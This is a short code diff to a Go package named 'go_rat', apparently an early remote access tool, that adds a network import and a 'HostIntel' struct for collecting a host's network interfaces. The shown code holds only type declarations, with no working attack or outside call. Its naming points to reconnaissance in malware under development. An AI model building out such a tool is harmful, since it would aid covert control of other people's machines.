@@ -7,7 +7,10 @@ each concept has its own faucets, traits, and actions
 
 package go_rat
 
-import "encoding/json"
+import (
+	"encoding/json"
+	"net"
+)
 
 // import the libraries we need
 
@@ -33,3 +36,7 @@ type CommandSet struct {
 type OutgoingMessage struct {
 	contents json.RawMessage
 }
+
+// struct to hold intel about host
+type HostIntel struct {
+	interfaces []net.Interface
